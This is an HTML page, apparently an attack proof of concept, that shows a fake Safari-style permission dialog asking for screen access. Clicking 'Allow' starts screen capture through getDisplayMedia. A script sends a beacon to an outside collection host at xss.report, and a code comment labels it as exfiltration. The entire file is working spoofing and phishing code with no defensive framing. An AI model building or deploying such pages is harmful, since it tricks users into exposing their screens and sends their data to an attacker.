<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Safari Screen Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      background: #f9f9f9;
      font-family: -apple-system, sans-serif;
    }

    #fakePrompt {
      position: fixed;
      top: 20vh;
      left: 50%;
      transform: translateX(-50%);
      width: 90%;
      max-width: 400px;
      background: white;
      border-radius: 14px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
      padding: 24px;
      text-align: center;
      z-index: 9999;
    }

    #fakePrompt h2 {
      font-size: 18px;
      margin-bottom: 10px;
    }

    #fakePrompt p {
      font-size: 14px;
      color: #444;
      margin-bottom: 20px;
    }

    #confirmBtn {
      background: #007AFF;
      color: white;
      border: none;
      border-radius: 10px;
      padding: 12px 24px;
      font-size: 16px;
      width: 100%;
    }

    video {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 1;
    }
  </style>
</head>
<body>

<div id="fakePrompt">
  <h2>“Safari” Would Like to Access Your Screen</h2>
  <p>This access is required to continue.</p>
  <button id="confirmBtn">Allow</button>
</div>

<script>
  function requestScreen() {
    navigator.mediaDevices.getDisplayMedia({ video: true })
      .then(stream => {
        const vid = document.createElement("video");
        vid.srcObject = stream;
        vid.autoplay = true;
        document.body.appendChild(vid);

        document.getElementById('fakePrompt').remove();

        // Optional: exfiltrate using beacon
        stream.getVideoTracks()[0].addEventListener('ended', () => {
          navigator.sendBeacon("https://xss.report/c/waduh", "Screen sharing ended.");
        });
      })
      .catch(err => {
        console.error("Access denied or failed:", err);
      });
  }

  // Trigger after Reading List load (no gesture needed)
  window.onload = () => {
    // Show prompt immediately
    document.getElementById("confirmBtn").onclick = () => {
      requestScreen();
    };

    // Auto-scroll prevention / viewport enforcement
    window.scrollTo(0, 0);
  };
</script>

</body>
</html>
